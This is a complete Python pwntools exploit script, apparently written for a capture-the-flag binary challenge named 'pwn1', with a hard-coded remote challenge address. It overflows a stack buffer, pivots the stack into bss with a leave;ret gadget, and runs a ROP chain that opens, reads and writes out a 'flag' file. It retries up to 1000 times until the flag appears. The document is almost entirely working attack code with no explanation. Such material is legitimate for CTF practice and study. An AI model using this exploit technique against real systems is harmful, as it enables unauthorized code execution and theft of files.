from pwn import *
from pwnlib import timeout

# context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn1"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)


def get_io():
    if not f_remote:
        io = process([vuln_path])
        # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
    else:
        io = remote("39.106.16.204", 31810)

    return io


def ddebug(io, b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


leave_ret = 0x0000000000401897
vuln_read = 0x000000000401AE2
bss = 0x4CD900 + 0x100


def pwn(io):
    payload = b"t"*0x38
    payload += p64(bss)
    payload += p64(vuln_read)

    # ddebug(f"b *{leave_ret}\ncontinue")
    # ddebug(io, "b *0x447b90  \ncontinue")
    ddebug(io, "b *0x447ad2 \ncontinue")
    io.sendlineafter("skill\n", payload)

    """
    0x0000000000401897 : leave ; ret
    0x000000000040a23e : pop rsi ; ret
    0x00000000004021cf : pop rdi ; ret
    0x000000000047fbab : pop rdx ; pop rbx ; ret
    0x000000000044b871 : push rax ; ret
    0x0000000000493cac : mov edi, dword ptr [rbp - 8] ; leave ; ret
    0x0000000000401731 : pop rbp ; ret
    """
    pop_rsi = 0x40a23e
    pop_rdi = 0x4021cf
    flag_path = 0x4cd9c8
    open64 = 0x447A50
    read_addr = 0x0447B80
    pop_rdx = 0x000000000047fbab
    write_adr = 0x447c20

    payload = b"flag\x00".ljust(0x38, b"\x00")
    payload += p64(bss)

    for _ in range(20):
        payload += p64(pop_rsi) + p64(0)
        payload += p64(pop_rdi) + p64(flag_path)
        payload += p64(open64)

    payload += p64(pop_rdx) + p64(100) + b"tinyfat\x00"
    payload += p64(pop_rsi) + p64(bss)
    payload += p64(pop_rdi) + p64(0x7a)
    payload += p64(read_addr)

    payload += p64(pop_rsi) + p64(bss)
    payload += p64(pop_rdi) + p64(0x31)
    payload += p64(write_adr)
    io.sendline(payload)
    if f_gdb:
        sleep(10000000)

    data = io.recv(timeout=0.5)
    if b"{" in data and b"}" in data:
        log.success(data)
        return True

    return False

if f_gdb:
    io = get_io()
    pwn(io)
else:
    for i in range(1000):
        log.success(f"-------{i}--------")
        io = get_io()
        try:
            if pwn(io):
                break
        except:
            pass
        finally:
            io.close()

        sleep(0.1)

